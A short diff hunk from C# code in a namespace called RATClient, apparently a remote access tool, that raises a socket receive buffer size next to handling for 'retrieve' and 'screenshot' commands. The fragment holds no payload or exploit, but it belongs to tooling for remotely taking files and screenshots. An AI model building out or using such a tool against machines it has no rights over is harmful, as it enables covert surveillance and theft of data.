@@ -119,7 +119,7 @@ namespace RATClient
                 nstream.Write(sendBytes, 0, sendBytes.Length);
                 nstream.Flush();
                 if (c.CMD == "retrieve" || c.CMD == "screenshot") sock.ReceiveBufferSize = 2097152;
-                else sock.ReceiveBufferSize = 8192;
+                else sock.ReceiveBufferSize = 65536;
                 byte[] message = new byte[sock.ReceiveBufferSize + 1];
                 int bytesRead = nstream.Read(message, 0, Convert.ToInt32(sock.ReceiveBufferSize));
                 if (bytesRead == 0) return;
